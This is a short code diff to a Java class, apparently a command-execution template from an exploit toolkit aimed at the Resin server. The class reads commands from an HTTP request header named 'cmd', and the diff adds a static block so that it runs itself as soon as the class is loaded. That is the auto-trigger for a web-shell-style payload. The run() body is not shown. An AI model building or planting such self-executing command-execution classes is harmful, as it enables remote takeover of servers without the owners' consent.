@@ -6,12 +6,19 @@ import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.Scanner;
 
-public class ResinCmdExecTpl {
+public class CmdExec
+{
     private String getReqHeaderName() {
         return "cmd";
     }
 
-    public ResinCmdExecTpl(){
+    static {
+        try {
+            new CmdExec();
+        } catch (Exception e) {
+        }
+    }
+    public CmdExec(){
         run();
     }
 
